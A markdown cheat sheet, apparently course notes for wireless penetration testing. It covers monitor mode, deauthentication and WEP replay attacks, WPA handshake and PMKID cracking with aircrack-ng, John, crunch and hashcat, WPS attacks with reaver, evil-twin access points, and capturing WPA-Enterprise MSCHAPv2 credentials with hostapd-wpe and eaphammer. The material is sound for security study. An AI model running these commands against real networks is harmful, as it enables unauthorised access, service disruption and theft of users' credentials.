# üõ∞Ô∏è Offensive Security Wireless Pen-Testing Cheat Sheet

---

## A. Dependancies

Packages that are needed on the OS for success:

```bash
sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

## B. Hardware Prep

**Detailed info about attached USBs**

`sudo lsusb -vv`

The iw utility and its variety of options is the only command we need for configuring a Wi-Fi device.

`sudo iw list`

**The rfkill Utility**

`sudo rfkill block all` [Block every type of radio]

`sudo rfkill list`[list and kill by radio designation]

## üì° 1. Preparation

```bash
# Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0

# OR using iw
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
# Check interfaces
iwconfig
```

### WireShark

Wireshark filter

`wlan.fc.type == 2`

###### Remote Packet Capture

`ssh root@10.11.0.196 "sudo -S tcpdump -U -w - -i wlan0mon" | sudo wireshark -k -i -`

---

## üîç 2. Discovery & Reconnaissance

```bash
# Scan for APs and clients
airodump-ng start wlan0mon
# or
airodump-ng start wlan0
# Airmon-ng does not provide any confirmation that monitor mode has been
# started on the specified channel. Running iw shows that the monitor mode 
# interface is listening on the desired channel and frequency.
sudo iw dev wlan0mon info
sudo airmon-ng --verbose

# stoping monitor mode
sudo airmon-ng stop wlan0mon
```

### Airodump-ng

The options we will use most often are saving to a file, filtering
by BSSID, and capturing only on a specific channel.

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| -w prefix     | Saves the capture dump to the specified filename            |
| --bssid BSSID | Filters Airodump-ng to only capture the specified BSSID     |
| -c channel(s) | Forces Airodump-ng to only capture the specified channel(s) |

```bash
# Target specific BSSID and channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

`airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w 
./wireless_cap/testing_my_knowledge`  
```

The table below contains descriptions of all of the Airodump-ng
fields in the top section, where APs are displayed.

| Field   | Description                                                                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| BSSID   | The MAC address of the AP                                                                                                                                                                                                                    |
| PWR     | The signal level reported by the card, which will get higher as we get closer to the AP or station                                                                                                                                           |
| RXQ     | Receive Quality as measured by the percentage of frames successfully received over the last 10 seconds                                                                                                                                       |
| Beacons | Number of announcement frames sent by the AP                                                                                                                                                                                                 |
| # Data  | Number of captured data packets (if WEP, this is the unique IV count), including data broadcast packets                                                                                                                                      |
| #/s     | Number of data packets per second measured over the last 10 seconds                                                                                                                                                                          |
| CH      | Channel number taken from beacon frames. Note that sometimes frames from other channels are captured due to overlapping channels                                                                                                             |
| MB      | Maximum speed supported by the AP. 11=802.11b, 22=802.11b+, up to 54 is 802.11g and anything higher is 802.11n or 802.11ac                                                                                                                   |
| ENC     | Encryption algorithm in use. OPN=no encryption, "WEP?"=WEP or higher<br> (not enough data to choose between WEP and WPA/WPA2), WEP=static or <br>dynamic WEP, and WPA or WPA2 if TKIP or CCMP is present. WPA3 and OWE <br>both require CCMP |
| CIPHER  | The cipher detected: CCMP, WRAP, TKIP, WEP, WEP40, or WEP104                                                                                                                                                                                 |
| AUTH    | The authentication protocol used. One of MGT (WPA/WPA2/WPA3 <br>Enterprise), SKA (WEP shared key), PSK (WPA/WPA2/WPA3 pre shared key), <br>or OPN (WEP open authentication)                                                                  |
| ESSID   | The so-called SSID, which can be empty if the SSID is hidden                                                                                                                                                                                 |

### Airodump Output parameters

By default, executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of
formats:

- PCAP, with a cap extension.
- CSV, with a csv extension.
- Kismet legacy CSV, with a kismet.csv extension.
- Kismet legacy NetXML, with a kismet.netxml extension.
- Log CSV, with a log.csv extension.

Two additional files are created with certain options:

- GPS coordinates, with a gps extension when the -g option and a GPS device is configured. More details about this feature
  in a later section.
- Initialization Vector (IVS), with a .ivs extension with
  the --ivs option. In this case, only the IVS file will be
  created. This option is only useful for WEP cracking.

### Airodump Interactive mode

`space` == pause

`tab` == interactive mode

`arrow up` `arrow down` == scrolling

`A` == display options

`S` == sorting options

`I` == Invert sorting

`D` == Default sort

---

## üèπ 3. WEP Attacks [Aireplay-ng]

| Attack # | Attack Name                          |
| -------- | ------------------------------------ |
| 0        | Deauthentication                     |
| 1        | Fake Authentication                  |
| 2        | Interactive Packet Replay            |
| 3        | ARP Request Replay Attack            |
| 4        | KoreK ChopChop Attack                |
| 5        | Fragmentation Attack                 |
| 6        | CafeÃÅ-Latte Attack                   |
| 7        | Client-Oriented Fragmentation Attack |
| 8        | WPA Migration Mode Attack            |
| 9        | Injection Test                       |

```bash
# Fake auth [this is to make sure that you can talk with the AP prior to 
# your attack]
aireplay-ng -1 0 -a <BSSID> -h <Your_MAC> wlan0mon

#Deauth
aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0


# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <Your_MAC> wlan0mon
```

| Option    | Description                             |
| --------- | --------------------------------------- |
| -x nbpps  | Number of packets per second            |
| -p fctrl  | Set frame control word (hex)            |
| -a bssid  | Access point MAC address                |
| -c dmac   | Destination MAC address                 |
| -h smac   | Source MAC address                      |
| -e essid  | Target AP SSID                          |
| -j        | arpreplay attack: inject FromDS packets |
| -g value  | Change ring buffer size (default: 8)    |
| -k IP     | Destination IP in fragments             |
| -l IP     | Source IP in fragments                  |
| -o npckts | Number of packets per burst (-1)        |
| -q sec    | Seconds between keep-alives (-1)        |
| -y prga   | Keystream for shared key authentication |
| -B        | Bit rate test                           |
| -D        | Disable AP detection                    |
| -F        | Chooses first matching packet           |
| -R        | Disables /dev/rtc usage                 |

---

## üîì 4. WPA/WPA2 Handshake Capture

While performing the WEP attack capture must be running. 

```bash
# Capture WPA handshake in pcap
airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w ./wireless_cap/testing_my_knowledge  

# Deauth clients to force handshake
aireplay-ng -0 10 -a <BSSID> wlan0mon

aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0
```

---

## üîë 5. Crack WPA/WPA2 (PSK)

```bash
# Aircrack with wordlist and John
aircrack-ng -w <wordlist.txt> -b <BSSID> handshake.cap

aircrack-ng -w /usr/share/john/password.lst -e wifu
-b 34:08:04:09:3D:38 wpa-01.cap


```

How to confirm that the password is correct:

`-b` == BSSID

`-e` == ESSID

`-p` == cracked password you want to confirm



example:

`airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap`



### Aircrack-ng and John

```bash
#John password file location
/usr/share/john/password.lst

#The JtR mangling rules are located
 /etc/john/john.conf,

#Chaning JtR rules can be as simple as 
sudo nano /etc/john/john.conf
# Add two numbers to the end of each password
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]

#have your new custom wordlist output for use with aircrack-ng
john --wordlist=/usr/share/john/password.lst --rules --stdout 
| aircrack-ng -e wifu -w - ~/wpa-01.cap
```



### Aircrack-ng and Crunch

```bash
Crunch also allows us to specify a pattern with the -t option with or
 without a character set. Different symbols in the pattern define the
 type of character to use.
Cruch requires only minimum length and maximum length of the password.

crunch _min_ _max_ options 
    @ represents lowercase characters or characters from a defined set
    , represents uppercase characters
    % represent numbers
    ^ represents symbols

#How to fill in for possible missing characters. 
crunch 11 11 -t password%%%
# or 
crunch 11 11 0123456789 -t password@@@

# The -p option generates unique words from a character set or a set of 
# whole words. 
crunch 1 1 -p dog cat bird
# this creates all of the different variations of bird, dog, and cat together
# as a single password

#you can combine generation and words by doing the following
crunch 5 5 -t ddd%% -p dog cat bird
crunch 5 5 aADE -t ddd@@ -p dog cat bird

#Now we can pipe the data from crunch into aircrack-ng
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap 
-w -
```



### Aircrack-ng and rsmangler

```bash
# RSMangler can create a giant wordlist for password cracking 
# that can either be piped to other tools or saved to a file.


Steps:

1. create new wordlist file with individual words line seperated
2. point rsmangler to the file 

rsmangler --file wordlist.txt
rsmangler --file wordlist.txt --output mangled.txt [output the new RS file]

3. Using --min and --max options, we limit the length of the
   RSMangler words

4. Point RSmangler to aircrack-ng

rsmangler --file wordlist.txt --min 12 --max 13 
| aircrack-ng -e wifu rsmangler-01.cap -w -
```




---

## ü¶ä 6. WPA/WPA2 PMKID Attack [Using Hashcat]

```bash
# Convert .cap to .hccapx for hashcat
cap2hccapx handshake.cap handshake.hccapx

# Crack with hashcat
hashcat -m 2500 handshake.hccapx wordlist.txt

hashcat -m 2500 --deprecated-check-disable output.hccapx
 /usr/share/john/password.lst

hashcat -a 0 -m  22000  hash.hc22000 /usr/share/john/password.lst
```

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o pmkid.16800 -E essidlist.txt dump.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt
```

---

## üß™ 7. WPS Attacks

```bash
# WPS scan
wash -i wlan0mon

# Reaver WPS attack
reaver -i wlan0mon -b <BSSID> -c <channel> -vv

# Pixie Dust attack (if vulnerable)
reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv
```

---

## üì∂ 8. Rogue AP / Evil Twin

```bash
# Create rogue AP with hostapd-wpe or airbase-ng
airbase-ng -e "FreeWiFi" -c <channel> wlan0mon

# Use DHCP server and sslstrip/mitmproxy for MITM
```

---

## üõ†Ô∏è 9. Useful Tools

- `aircrack-ng suite`: deauth, crack, monitor
- `hcxdumptool`, `hcxpcapngtool`: PMKID capture & conversion
- `hashcat`: fast GPU cracking
- `Wireshark`: packet inspection
- `hostapd-wpe`, `EvilAP`, `wifiphisher`: rogue AP/MITM
- `reaver`, `bully`: WPS attacks

---

## üßº 10. Cleanup

```bash
# Stop monitor mode
airmon-ng stop wlan0mon
service NetworkManager restart
```

---

# üîê WPA-Enterprise (802.1X / PEAP / MSCHAPv2) Crack Walkthrough

> **Objective**: Set up a rogue AP, force a client to connect, capture MSCHAPv2 hashes, and crack them.

---

## ‚úÖ Requirements

- Wireless adapter supporting AP mode
- `hostapd-wpe` or `eaphammer`
- `asleap` or `hashcat` (to crack captured credentials)
- `bettercap` (optional MITM + logging)

---

## üèóÔ∏è Step-by-Step: Using hostapd-wpe

### 1. Install hostapd-wpe

```bash
apt install hostapd-wpe
```

---

### 2. Configure hostapd-wpe

Edit the config (`/etc/hostapd-wpe/hostapd-wpe.conf`):

```conf
interface=wlan0
ssid=CorpWiFi
channel=6
driver=nl80211
logger_stdout=-1
logger_stdout_level=2
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=secret
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
```

---

### 3. Start Rogue AP

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Wait for a client to connect. You'll see captured **MSCHAPv2** challenge/response hashes in `/var/www/html/`.

---

### üì¶ Example Output

```text
USERNAME: alice
CHALLENGE: xxxxxxxxxxxxx
RESPONSE: yyyyyyyyyyyyy
```

---

### 4. Crack with asleap

```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W wordlist.txt
```

Or use hashcat:

```bash
# Format for hashcat -m 5500 (MSCHAPv2)
<username>::<domain>:<challenge>:<response>:unused

# Run with hashcat
hashcat -m 5500 hash.txt wordlist.txt
```

---

## üõ† Alternative: Using Eaphammer

```bash
apt install eaphammer

# Simple rogue AP attack
eaphammer --interface wlan0 --essid CorpWiFi --creds

# With deauth
eaphammer --interface wlan0 --essid CorpWiFi --channel 6 --deauth --creds
```

Captured credentials appear in `/var/lib/eaphammer/`.

---

## üîê Cracking Captured Hashes with Hashcat

```bash
hashcat -m 5500 hash.txt rockyou.txt
hashcat -m 5500 hash.txt rockyou.txt --show
```

---

## üßº Cleanup

```bash
airmon-ng stop wlan0mon
service NetworkManager restart
```

---

## ‚ò†Ô∏è Notes

- WPA-Enterprise attacks don‚Äôt yield pre-shared keys like WPA2-PSK.
- These attacks rely on **social engineering + rogue APs**.
- Success depends on users connecting and entering credentials.
- Certificate warnings can tip off users.
